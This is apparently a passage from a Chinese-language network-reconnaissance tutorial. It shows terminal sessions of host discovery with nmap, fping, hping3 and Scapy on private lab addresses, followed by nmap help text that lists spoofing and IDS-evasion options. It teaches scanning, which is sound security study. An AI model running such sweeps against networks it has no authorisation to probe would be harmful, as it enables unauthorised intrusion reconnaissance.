<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap 192.168.1.1-100 -sn</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 08:58 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00099s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00098s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211120220001447-1648727395.png" /></p>
<h3 id="fping">4、fping</h3>
<p><strong>基本用法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># fping 10.10.10.2 -c 3</span></span><br><span class="line">10.10.10.2 : [0], 64 bytes, 0.820 ms (0.820 avg, 0% loss)</span><br><span class="line">10.10.10.2 : [1], 64 bytes, 0.457 ms (0.639 avg, 0% loss)</span><br><span class="line">10.10.10.2 : [2], 64 bytes, 0.267 ms (0.515 avg, 0% loss)</span><br><span class="line"></span><br><span class="line">10.10.10.2 : xmt/rcv/%loss = 3/3/0%, min/avg/max = 0.267/0.515/0.820</span><br></pre></td></tr></table></figure>
<p><strong>fping支持对地址段的扫描：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># fping -g 10.10.10.2 10.10.10.6 -c 1</span></span><br><span class="line">10.10.10.2 : [0], 64 bytes, 0.292 ms (0.292 avg, 0% loss)</span><br><span class="line">10.10.10.3 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.4 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.5 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.6 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line"></span><br><span class="line">10.10.10.2 : xmt/rcv/%loss = 1/1/0%, min/avg/max = 0.292/0.292/0.292</span><br><span class="line">10.10.10.3 : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">10.10.10.4 : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">10.10.10.5 : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">10.10.10.6 : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># fping -g 10.10.10.0/24                                                                                             1 ⨯</span></span><br><span class="line">10.10.10.2 is alive</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.1</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.1</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.1</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.1</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.4</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.4</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.4</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.4</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.3</span><br><span class="line"></span><br><span class="line">………………</span><br><span class="line"></span><br><span class="line">10.10.10.1 is unreachable</span><br><span class="line">10.10.10.3 is unreachable</span><br><span class="line">10.10.10.4 is unreachable</span><br><span class="line">10.10.10.5 is unreachable</span><br><span class="line">10.10.10.6 is unreachable</span><br><span class="line">10.10.10.7 is unreachable</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<p><strong>支持文件调用：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># fping -f /home/kali/Desktop/list.txt -c 1                                                                          1 ⨯</span></span><br><span class="line">10.10.10.2   : [0], 64 bytes, 0.169 ms (0.169 avg, 0% loss)</span><br><span class="line">10.10.10.1   : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.254 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.89  : [0], timed out (NaN avg, 100% loss)</span><br><span class="line"></span><br><span class="line">10.10.10.1   : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">10.10.10.254 : xmt/rcv/%loss = 1/0/100%</span><br><span class="line">10.10.10.2   : xmt/rcv/%loss = 1/1/0%, min/avg/max = 0.169/0.169/0.169</span><br><span class="line">10.10.10.89  : xmt/rcv/%loss = 1/0/100%  </span><br><span class="line"> ┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># fping -g 10.10.10.0/24 -c 1 &gt;&gt;result.txt</span></span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.1</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.5</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.4</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.3</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.7</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.6</span><br><span class="line">ICMP Host Unreachable from 10.10.10.135 <span class="keyword">for</span> ICMP Echo sent to 10.10.10.10</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ls </span></span><br><span class="line">Desktop Documents Downloads Music Pictures Public result.txt Templates Videos</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># cat result.txt</span></span><br><span class="line">10.10.10.2 : [0], 64 bytes, 0.403 ms (0.403 avg, 0% loss)</span><br><span class="line">10.10.10.1 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.3 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.4 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.5 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.6 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.7 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.8 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.9 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.10 : [0], timed out (NaN avg, 100% loss)</span><br><span class="line">10.10.10.11 : [0], timed out (NaN avg, 100% loss)</span><br></pre></td></tr></table></figure>
<h3 id="hping命令">5、Hping命令</h3>
<ul>
<li><strong>能发送几乎任意的TCP/IP包（可指定对应字段）</strong></li>
<li><strong>每次只能扫描一个目标</strong></li>
<li><strong>可用于压力测试</strong></li>
</ul>
<p><strong>基本用法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.2 --icmp -c 2　　　　　　　　#对存在的IP探测</span></span><br><span class="line">HPING 10.10.10.2 (eth0 10.10.10.2): icmp mode <span class="built_in">set</span>, 28 headers + 0 data bytes</span><br><span class="line">len=46 ip=10.10.10.2 ttl=128 <span class="built_in">id</span>=1675 icmp_seq=0 rtt=5.6 ms</span><br><span class="line">len=46 ip=10.10.10.2 ttl=128 <span class="built_in">id</span>=1676 icmp_seq=1 rtt=2.5 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.2 hping statistic ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 2.5/4.1/5.6 ms</span><br><span class="line">                                                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.3 --icmp -c 2　　　　　　　　#对不存在的IP探测情况</span></span><br><span class="line">HPING 10.10.10.3 (eth0 10.10.10.3): icmp mode <span class="built_in">set</span>, 28 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 10.10.10.3 hping statistic ---</span><br><span class="line">2 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211120223100123-384468833.png" /></p>
<p><strong>对某一地址段探测：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># for addr in $(seq 1 100) ; do hping3 10.10.10.$addr  --icmp -c 1 &gt;&gt;handle.txt  &amp; done      </span></span><br><span class="line"></span><br><span class="line">[2] 3007</span><br><span class="line">[3] 3008</span><br><span class="line">[4] 3009</span><br><span class="line"></span><br><span class="line">………………</span><br><span class="line"></span><br><span class="line">--- 10.10.10.1 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.2 hping statistic ---</span><br><span class="line">1 packets transmitted, 1 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 9.0/9.0/9.0 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.3 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.4 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line">………………</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># cat handle.txt | grep ^len  　　　　 #过滤出以len开头活着的主机</span></span><br><span class="line">len=46 ip=10.10.10.2 ttl=128 <span class="built_in">id</span>=1677 icmp_seq=0 rtt=9.0 ms                                                           </span><br></pre></td></tr></table></figure>
<h2 id="四层发现">5. 四层发现</h2>
<p><strong>优点：</strong></p>
<ul>
<li>可路由且结果可靠（借助对端口探测的结果评判IP是否存在）</li>
<li>防火墙过滤可能小</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>全端口（1-65535）的扫描速度慢</li>
<li>基于状态过滤的防火墙依旧可过滤扫描</li>
</ul>
<p><strong>TCP</strong></p>
<ul>
<li>不建立连接直接发ACK探测，如果目标返回reset包（注意，并不是所有的主机都会返回，主机如果做了过滤，则不会返回reset包），即可证明
IP 存在。</li>
<li>正常进行TCP三次握手操作，src发完SYN后，目标IP存在：</li>
<li>对应端口开放则会收到SYN+ACK数据包；</li>
<li>端口关闭则收到RST数据包。</li>
</ul>
<p><strong>UDP</strong></p>
<ul>
<li>UDP只管发送，不管确认。</li>
<li>即便IP存在且对应端口开放，但由于发的是四层数据包，没有应用层数据信息，该数据包是不完整的，目标IP是不回去处理的。</li>
<li>不过我们依旧可以依靠udp协议对访问端口关闭处理的信息推测主机存在否，即当目标IP存在，但探测端口是关闭的，则会向源IP返回ICMP不可达的信息判断出该IP存在！</li>
</ul>
<h3 id="scapy-2">1、scapy</h3>
<p><strong>TCP探测，采用ACK ----RST模式，示例如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                      </span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | To craft a packet, you have to be a</span><br><span class="line">       scccccp///pSP///p          p//Y   | packet, and learn how to swim <span class="keyword">in</span></span><br><span class="line">      sY/////////y  caa           S//P   | the wires and <span class="keyword">in</span> the waves.</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme</span><br><span class="line">        sY/PsY////YCc          aC//Yp    |</span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt; i=IP()</span><br><span class="line">&gt;&gt;&gt; t=TCP()</span><br><span class="line">&gt;&gt;&gt; it=(i/t)</span><br><span class="line">&gt;&gt;&gt;it.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">src= 127.0.0.1</span><br><span class="line">  dst= 127.0.0.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0 flags =S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; it[IP].dst=<span class="string">&quot;192.168.1.1&quot;</span>　　　　　　　　<span class="comment">#个人路由器</span></span><br><span class="line">&gt;&gt;&gt; it[TCP].flags=<span class="string">&#x27;A&#x27;</span>　　　　　　　　　　　　<span class="comment">#指定直接发ACK数据包</span></span><br><span class="line">&gt;&gt;&gt;it.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">src= 192.168.1.109　　　　　　　　　　　　<span class="comment">#会自动识别填充</span></span><br><span class="line">  dst= 192.168.1.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= A</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; a=sr1(it,<span class="built_in">timeout</span>=1,verbose=1)　　　　　　　　　　<span class="comment">#发包探测</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received2 packets, got 0 answers, remaining 1 packets  　　<span class="comment">#未收到reset包这是由于个人路由器做了过滤，一般主机都是会返回一个reset包，如10.10.10.2这个。</span></span><br><span class="line">&gt;&gt;&gt; it[IP].dst=<span class="string">&quot;10.10.10.2&quot;</span></span><br><span class="line">&gt;&gt;&gt;it.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 10.10.10.135</span><br><span class="line">  dst= 10.10.10.2</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= A</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; a=sr1(it,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt;a.display()　　　　　　　　　　　　　　　　<span class="comment">#查看回包内容</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 40</span><br><span class="line">  <span class="built_in">id</span>= 65248</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 128</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= 0x1353</span><br><span class="line">  src= 10.10.10.2</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= http</span><br><span class="line">     dport= ftp_data</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= 5</span><br><span class="line">     reserved= 0 flags =R　　　　　　　　　　　　　　　　　　<span class="comment">#可见返回了个reset数据包，有时候是数字4（reset二进制转为十进制做的），可抓包理解</span></span><br><span class="line">     window= 32767</span><br><span class="line">     chksum= 0x6e1</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span> </span><br><span class="line">        &gt; &gt;&gt; it[TCP].dport=445</span><br><span class="line">        &gt; &gt;&gt; a=sr1(it,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received1 packets, got 1 answers, remaining 0 packets</span><br></pre></td></tr></table></figure>
<p><strong>UDP探测（ICMP端口不可达即可判断IP存在）示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; &gt;&gt; u=UDP()</span><br><span class="line">&gt;&gt;&gt; iu=(i/u)</span><br><span class="line">&gt;&gt;&gt;iu.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= udp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 127.0.0.1</span><br><span class="line">  dst= 127.0.0.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ UDP ]### </span></span><br><span class="line">     sport= domain</span><br><span class="line">     dport= domain</span><br><span class="line">     len= None</span><br><span class="line">     chksum= None</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; iu[IP].dst=<span class="string">&quot;10.10.10.2&quot;</span></span><br><span class="line">&gt;&gt;&gt; iu[UDP].dport=33333</span><br><span class="line">&gt; &gt;&gt; a1=sr1(iu,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received1 packets, got 0 answers, remaining 1 packets&gt; &gt;&gt; iu[UDP].dport=53</span><br><span class="line">&gt;&gt;&gt; a1=sr1(iu,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received0 packets, got 0 answers, remaining 1 packets&gt; &gt;&gt; iu[UDP].dport=19291</span><br><span class="line">&gt;&gt;&gt; a1=sr1(iu,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 1 packets, got 0 answers, remaining 1 packets</span><br><span class="line">&gt; &gt;&gt; iu[IP].dst=<span class="string">&quot;192.168.1.1&quot;</span></span><br><span class="line">&gt; &gt;&gt; a1=sr1(iu,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 2 packets, got 0 answers, remaining 1 packets</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p><strong>备注：</strong>
UDP不可靠，如上面测试的实例中居然没回一个ICMP端口不可达。。。</p>
<h3 id="nmap-2">2、nmap</h3>
<p><strong>命令参数（help）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -h                </span></span><br><span class="line">Nmap 7.91 ( https://nmap.org )</span><br><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sn: Ping Scan - <span class="built_in">disable</span> port scan</span><br><span class="line">  -Pn: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports</span><br><span class="line">  -PE/PP/PM: ICMP <span class="built_in">echo</span>, timestamp, and netmask request discovery probes</span><br><span class="line">  -PO[protocol list]: IP Protocol Ping</span><br><span class="line">  -n/-R: Never <span class="keyword">do</span> DNS resolution/Always resolve [default: sometimes]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers</span><br><span class="line">  --system-dns: Use OS<span class="string">&#x27;s DNS resolver</span></span><br><span class="line"><span class="string">  --traceroute: Trace hop path to each host</span></span><br><span class="line"><span class="string">SCAN TECHNIQUES:</span></span><br><span class="line"><span class="string">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans</span></span><br><span class="line"><span class="string">  -sU: UDP Scan</span></span><br><span class="line"><span class="string">  -sN/sF/sX: TCP Null, FIN, and Xmas scans</span></span><br><span class="line"><span class="string">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span></span><br><span class="line"><span class="string">  -sI &lt;zombie host[:probeport]&gt;: Idle scan</span></span><br><span class="line"><span class="string">  -sY/sZ: SCTP INIT/COOKIE-ECHO scans</span></span><br><span class="line"><span class="string">  -sO: IP protocol scan</span></span><br><span class="line"><span class="string">  -b &lt;FTP relay host&gt;: FTP bounce scan</span></span><br><span class="line"><span class="string">PORT SPECIFICATION AND SCAN ORDER:</span></span><br><span class="line"><span class="string">  -p &lt;port ranges&gt;: Only scan specified ports</span></span><br><span class="line"><span class="string">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span></span><br><span class="line"><span class="string">  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning</span></span><br><span class="line"><span class="string">  -F: Fast mode - Scan fewer ports than the default scan</span></span><br><span class="line"><span class="string">  -r: Scan ports consecutively - don&#x27;</span>t randomize</span><br><span class="line">  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports</span><br><span class="line">  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service/version info</span><br><span class="line">  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)</span><br><span class="line">  --version-light: Limit to most likely probes (intensity 2)</span><br><span class="line">  --version-all: Try every single probe (intensity 9)</span><br><span class="line">  --version-trace: Show detailed version scan activity (<span class="keyword">for</span> debugging)</span><br><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args <span class="keyword">in</span> a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show <span class="built_in">help</span> about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options <span class="built_in">which</span> take &lt;time&gt; are <span class="keyword">in</span> seconds, or append <span class="string">&#x27;ms&#x27;</span> (milliseconds),</span><br><span class="line">  <span class="string">&#x27;s&#x27;</span> (seconds), <span class="string">&#x27;m&#x27;</span> (minutes), or <span class="string">&#x27;h&#x27;</span> (hours) to the value (e.g. 30m).</span><br><span class="line">  -T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">  --host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof <span class="built_in">source</span> address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies</span><br><span class="line">  --data &lt;hex string&gt;: Append a custom payload to sent packets</span><br><span class="line">  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ip-options &lt;options&gt;: Send packets with specified ip options</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan <span class="keyword">in</span> normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;<span class="built_in">basename</span>&gt;: Output <span 